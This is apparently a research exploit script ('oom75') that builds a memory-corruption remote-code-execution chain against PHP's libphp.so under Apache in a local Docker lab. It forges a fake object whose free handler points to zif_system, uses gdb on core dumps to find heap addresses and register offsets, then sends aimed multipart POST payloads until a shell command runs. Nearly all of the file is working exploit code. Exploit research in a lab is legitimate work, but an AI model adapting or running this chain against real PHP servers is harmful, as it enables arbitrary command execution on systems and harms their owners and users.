#!/usr/bin/env python3
"""oom75: deterministic closing sequence — calibration + aimed dispatch.

Root-cause fix vs oom74: argz/gs were packed 8B early (T[80]/T[104]);
correct slots are T[88]/T[112] (P = VA0+8, so P+80 = VA0+88). oom74's
silence = dispatch happened but zif_system saw type-0 arg -> clean return.
oom73 had correct offsets but a 200B unaligned tile -> window hit CMD text.

Design:
  Tile 176B (16-aligned, 8 copies per 1537B value), layout (tile coords):
    T[8]=rc=1  T[12]=ti=0x108  T[16]=handle=1  T[24]=ce=0(never read)
    T[32]=handlers=VA0+152   T[52]=num_args=1(This.u2@frame+44)
    T[88]=argz{VA0+112, IS_STRING=6, 0}      (frame+80)
    T[112]=gs{rc=1,ti=0x106,h=0,len=13}      T[136]=CMD+NUL
    T[152]=table{offset=0, free_obj=&zif_system}
  Calibration: markers (0x4141..) in all 4 pointer slots (0,32,88,160)
    -> EVERY window position crashes -> rdi names phi; core bytes give VA0.
  Aimed: T[phi:phi+8] = VA0+3592 (next value's copy rc=1 field, verified
    in core first). Any walked copy -> decrement lands -> 0 -> store_del
    -> free_obj=zif_system -> system("whoami>/tmp/x").
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
AT_OFF = 0x1718
STRIDE = 3584


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def measure_bases():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    base = heap = None
    for ln in maps.splitlines():
        rng = ln.split()[0]
        a, b = [int(x, 16) for x in rng.split("-")]
        perms = ln.split()[1]
        if base is None and "libphp.so" in ln and perms.startswith("r"):
            base = a
        if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
                and (b - a) >= 0x200000 and perms.startswith("rw"):
            if heap is None:
                heap = a
    return base, heap


def build_tile(libphp_base, VA0, cal=False):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)   # rc, ti, handle, pad
    struct.pack_into("<Q", T, 32, VA0 + 152)          # handlers
    struct.pack_into("<I", T, 52, 1)                  # num_args (This.u2)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)  # argz value/type/u2
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)     # gs rc/ti/h
    struct.pack_into("<Q", T, 128, len(CMD))          # gs len (8B)
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, libphp_base + ZIF_SYSTEM)  # table{offset+pad, free_obj}
    if cal:
        MK = struct.pack("<Q", 0x414141414141)
        for off in (0, 32, 88, 160):
            T[off:off + 8] = MK
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c75_%s" % tag, 240)
    sh("docker cp /tmp/c75_%s phpbuild:/tmp/c75_%s" % (tag, tag), 240)
    return "/tmp/c75_%s" % tag


def core_rdi(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    return struct.pack("<Q", int(m.group(1), 16)) if m else None


def core_phi(T_cal, rdi8):
    d = T_cal * 2
    for phi in range(0, 176, 8):
        if d[phi:phi + 8] == rdi8:
            return phi
    return None


def core_va0(core_host, T_cal):
    """Parse PT_LOAD segments; find first T_cal[0:16] occurrence -> VA."""
    data = open(core_host, "rb").read()
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        p_type = struct.unpack_from("<I", data, o)[0]
        if p_type != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    pat = T_cal[:16]
    pos = 0
    while True:
        i = data.find(pat, pos)
        if i < 0:
            return None, 0
        for va, sz, off in segs:
            if off <= i < off + sz:
                return va + (i - off), 1
        pos = i + 1


def core_check_rc1(core_host, VA0):
    """Verify bytes at VA0+STRIDE+8 are rc=1 + ti=0x108."""
    data = open(core_host, "rb").read()
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    want = struct.pack("<II", 1, 0x108)
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        a = VA0 + STRIDE + 8
        if p_vaddr <= a and a + 8 <= p_vaddr + p_filesz:
            got = data[p_off + (a - p_vaddr):p_off + (a - p_vaddr) + 8]
            return got == want, got.hex()
    return False, "unmapped"


def check_x():
    return sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")


print("=== oom75: calibration + aimed dispatch ===", flush=True)
a = P.build_attack(3400, 9200000)
b = P.build_attack(3400, 9200000, value_tile=b"\x00" * 176)
assert len(a) == len(b), "envelope broken"
print("[0] envelope ok (%d B)" % len(a), flush=True)

boot_core_env()
base, heap = measure_bases()
VA0g = heap + AT_OFF
print("    libphp=0x%x heap=0x%x VA0(guess)=0x%x" % (base, heap, VA0g), flush=True)
T_cal = build_tile(base, VA0g, cal=True)

print("[1] warm (11 fires, calibration tile values)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T_cal))
print("    warm done", flush=True)

print("[2] sacrifice + calibration finishers (<=3, until crash)", flush=True)
phi = VA0 = None
for fi in range(3):
    code, resp = post(P.build_attack(3400, 9200000 + fi * 100000, value_tile=T_cal))
    print("  cal-fire%d: %s %r" % (fi, code, resp[:60]), flush=True)
    if code == "200":
        continue
    time.sleep(3)
    cb = fetch_core("cal%d" % fi)
    rdi8 = core_rdi("c75_cal%d" % fi)
    print("    rdi=%s" % (rdi8.hex() if rdi8 else "?"), flush=True)
    if rdi8 is None:
        continue
    phi = core_phi(T_cal, rdi8)
    VA0, nhits = core_va0("/tmp/c75_cal%d" % fi, T_cal)
    print("    phi=%s VA0=%s (hits=%d)" % (phi, hex(VA0) if VA0 else None, nhits), flush=True)
    if phi is not None and VA0:
        break

if phi is None or VA0 is None:
    print("[ABORT] calibration incomplete (phi=%s VA0=%s)" % (phi, VA0), flush=True)
    sys.exit(1)

ok, got = core_check_rc1("/tmp/c75_cal%d" % fi, VA0)
print("    rc=1 at VA0+%d: %s (%s)" % (STRIDE, ok, got), flush=True)
TARGET = VA0 + STRIDE + 8 if ok else VA0 + 8
print("    window pointer -> 0x%x" % TARGET, flush=True)

T_aim = build_tile(base, VA0, cal=False)
T_aim[phi:phi + 8] = struct.pack("<Q", TARGET)
print("[3] aimed finishers (phi=%d), check /tmp/x after each" % phi, flush=True)
for fi in range(3):
    code, resp = post(P.build_attack(3400, 9300000 + fi * 100000, value_tile=T_aim))
    print("  aim-fire%d: %s %r" % (fi, code, resp[:60]), flush=True)
    time.sleep(2)
    x = check_x()
    print("    /tmp/x: [%s]" % x, flush=True)
    if "No such" not in x:
        print("*** RCE CONFIRMED (aim-fire%d) ***" % fi, flush=True)
        break
    if code != "200":
        time.sleep(3)
        cb = fetch_core("aim%d" % fi)
        rdi8 = core_rdi("c75_aim%d" % fi)
        print("    crash rdi=%s (expected %s)" % (
            rdi8.hex() if rdi8 else "?", struct.pack("<Q", TARGET).hex()), flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
